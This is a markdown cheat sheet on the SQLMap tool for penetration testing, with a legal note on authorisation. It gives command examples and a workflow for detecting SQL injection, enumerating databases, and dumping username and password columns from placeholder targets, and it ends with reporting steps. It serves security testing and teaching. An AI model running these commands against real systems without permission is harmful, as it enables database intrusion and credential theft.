# SQLMap

> **Legal note**<br>
> This tool must only be used on systems you own or have explicit permission to test.

## Purpose / What does it do?

SQLmap is an automated tool to discover and exploit SQL-injection vulnerabilities in web applications.<br>
Used in penntesting and security analysis to check if it is possible to manipulate user inputs to attack databases.  

### In a Nutshell
- Identify SQL injection vulnerabilities
- Enumerate databases, tables, and columns
- Extract sensitive data
- Bypass authentication mechanisms
- Read write to the database
- Some cases get full system access

## Common commands

### Basic detection
```Bash
sqlmap -u 'https://site_to_be_attacked/page.php?id=123'
```
  

### Database enumeration
```Bash
# --dbs = List all databases
sqlmap -u 'https://site_to_be_attacked/page.php?id=123' --dbs
 

# -D databasename = selects a database 
# --tables = get all tablenames 
sqlmap -u 'https://site_to_be_attacked/page.php?id=123' -D acme_store --tables
```
### Table & column extraction
```Bash
# -T tablename = selects a table name 
# --columns = get columns
sqlmap -u 'https://site_to_be_attacked/page.php?id=123' -D acme_store -T users --columns
 
# -C username,password = Selects columns
# --dump = Dumps data
sqlmap -u 'https://site_to_be_attacked/page.php?id=123' -D acme_store -T users -C username,password --dump
```

###  Using request files
```Bash
# Use saved HTTP-request from exaple BurpSuite
sqlmap -r request.txt
```

### Automation & aggressiveness
```Bash
# --batch = dont ask questions just go. (Good for scripts)
sqlmap -u 'https://site_to_be_attacked/page.php?id=123' --batch

# HJow aggressive you want the script to be
# --level controls how many payloads and tests are used  
# --risk controls how potentially dangerous the payloads are  
sqlmap -u 'https://site_to_be_attacked/page.php?id=123' --level=5 --risk=3
```
  
## Workflow-example

1. Identify target and confirm SQL-Injection
```bash 
sqlmap -u "http://target/page.php?id=1"
```

2. List databases

```bash 
sqlmap -u "http://target/page.php?id=1" --dbs
```

3. Select database and show tables
```bash 
sqlmap -u "http://target/page.php?id=1" -D appdb --tables
```
 
4. Identify tasty tables, for example users, accounts, admin 

5. List columns
```bash 
sqlmap -u "http://target/page.php?id=1" -D appdb -T users --columns
```

6. Dump sensetive data
```bash 
sqlmap -u "http://target/page.php?id=1" -D appdb -T users -C email,password --dump
```

7. Report the vulnerability 

- What kind of injection
- The affected params
- What risk it poses
- And recomended actions to prevent it


## Resources
- [SQLMap](https://sqlmap.org/)
- [SQLMap - github](https://github.com/sqlmapproject/sqlmap)
- [OWASP - SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)